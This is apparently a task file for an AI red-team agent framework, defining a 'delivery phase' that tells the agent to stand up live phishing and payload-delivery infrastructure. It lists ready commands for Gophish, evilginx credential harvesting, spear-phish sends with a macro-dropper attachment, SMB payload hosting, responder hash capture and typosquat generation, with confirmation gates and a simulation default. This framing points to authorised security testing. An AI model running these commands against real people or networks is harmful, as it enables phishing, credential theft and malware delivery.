<!-- Powered by BMAD(R) Core -->

# Task: delivery-phase

## Purpose
- Design **and execute** delivery logistics, infrastructure, and monitoring for selected payloads/lures.
- Produce docs/red-team/delivery-report.md detailing channel selection, **live staging status**, detection coverage, and contingency paths.

## Prerequisites
- docs/red-team/payload-report.md
- Approved delivery channels and communication policies.
- Access to staging infrastructure (SMTP relay, web host, redirectors) or simulation workspace.
- Directories: build/infrastructure, reports/delivery.

## Success Criteria
- Delivery plan covers at least two viable channels with risk scoring, tooling, authentication requirements, and telemetry hooks.
- **Infrastructure is actually deployed or simulated (e.g., Gophish running, SMB share online).**
- Checklists for staging (TLS, DNS, tracking) are prepared and **validated via live output**.
- ATT&CK mappings (e.g., T1566, T1105, T1197) documented with detection/mitigation guidance.
- Handoff instructions equip Exploitation Agent with **confirmed ingress points** and monitoring expectations.

## Safety & Compliance
- **No real phishing or payload deployment without explicit authorisation; default to simulation.**
- Anonymise target data in artefacts; use lab domains where possible (e.g., `example-phish.com`).
- Ensure use of third-party services complies with legal/ethical standards.
- **All delivery actions require explicit user confirmation per channel.**

## Recommended Tooling
| Tool | Command | Goal | Expected Output |
| --- | --- | --- | --- |
| gophish | `sudo systemctl start gophish && /opt/gophish/gophish --config config.json` | Launch controlled phishing simulation server. | Gophish listening logs and admin URL. |
| sendemail | `sendemail -f {{from}} -t {{target_email}} -u '{{subject}}' -m '{{body}}' -a build/lures/macro-dropper-{{timestamp}}.docm -s {{smtp_server}}:587 -xu {{smtp_user}} -xp '{{smtp_pass}}'` | Scripted spear-phish send for testing. | SMTP success log or failure trace. |
| certbot | `certbot certonly --standalone -d {{phish_domain}} --email {{ops_email}} --agree-tos` | Obtain TLS certificates for phishing/staging infrastructure. | Certificate files under /etc/letsencrypt/. |
| evilginx | `evilginx -p ./profiles/google_phish.yaml -d {{phish_domain}} --proxy log` | Deploy reverse proxy credential harvest simulator. | Console log with listener status and captured sessions. |
| impacket-smbserver | `impacket-smbserver payloads ./build/payloads -smb2support` | Host payloads over SMB for internal delivery scenarios. | SMB share availability log. |
| urlcrazy | `urlcrazy {{target_domain}} --format csv > reports/delivery/urlcrazy-{{timestamp}}.csv` | Generate typosquat domains for lure setup or monitoring. | CSV file listing candidate domains and DNS status. |
| responder | `sudo responder -I {{interface}} -wrf` | Simulate responder-based network delivery for laterals. | Captured hash log entries with timestamps. |

## Procedure
1. Review `payload-report.md` to understand payload formats, dependencies, and observables. Note required infrastructure (SMTP, web, USB, SMB, cloud).
2. Confirm delivery constraints with stakeholders: allowable channels, sending domains, infrastructure ownership, maximum touch points.
3. Build a delivery channel matrix:
   - Email (e.g., spearphish, newsletter clone)
   - Web (drive-by, credential harvest)
   - Network/physical (USB drop, LLMNR poisoning)
   Score each for impact, detection likelihood, operational effort, and compliance.
4. **For each approved channel, prompt user: "Deploy [channel] infrastructure now? (y/N)"**
   - **If confirmed**, execute the corresponding tool:
     - **Email**: Start Gophish **or** send test email via `sendemail`
     - **Web**: Run `certbot` + `evilginx` to deploy live phishing site
     - **Network**: Launch `impacket-smbserver` or `responder`
   - Capture full stdout/stderr, store in `reports/delivery/{{tool}}-{{timestamp}}.log`
   - Verify service is reachable (e.g., `curl https://phish-domain`, `smbclient //localhost/payloads`)
5. Document staging steps in `build/infrastructure`:
   - Domain: `example-phish.com`
   - Cert: `/etc/letsencrypt/live/example-phish.com/`
   - Payload path: `build/lures/macro-dropper-12345.docm`
   - **Include actual service status** (e.g., "Gophish running on port 3333")
6. Define telemetry coverage: SIEM alerts, mail gateway rules, WAF logs, EDR triggers. Provide sample log entries or Sigma references.
7. Prepare contingency and rollback plans:
   - **Auto-generate shutdown commands** (e.g., `sudo systemctl stop gophish`)
   - Include cleanup scripts for certs, domains, logs
8. Populate `docs/red-team/.md` via template:
   - Include **live infrastructure status**, not just plans
   - Reference **actual log paths and service endpoints**
   - Note **test delivery results** (e.g., "Test email sent to ops@lab.local — delivered")
9. Store logs, config snippets, and verification outputs in `reports/delivery/` with timestamps.
10. Deliver a concise brief to the Exploitation Agent:
    > "SMB share `\\192.168.10.5\payloads` is live with `macro-dropper-12345.docm`.  
    > Phishing site `https://login.example-phish.com` active (evilginx).  
    > Monitoring: Watch for SMB connections and HTTP POSTs to /api."

## Decision Gates
- **Compliance Check**: escalate if proposed channel violates legal/contractual constraints.
- **Execution Confirmation**: **Never auto-deploy** — require "y" per channel.
- **Infrastructure Health**: if service fails to start, log error and mark channel as "simulation-only".
- **Detection Overload**: if telemetry shows high alert risk, recommend pausing or switching vectors.

## Outputs
- `docs/red-team/.md` (**with live service status**)
- **Running services or staged artefacts** in `build/infrastructure`
- **Real logs** in `reports/delivery/` (not just templates)
- Handoff summary for Exploitation phase with **confirmed delivery endpoints**

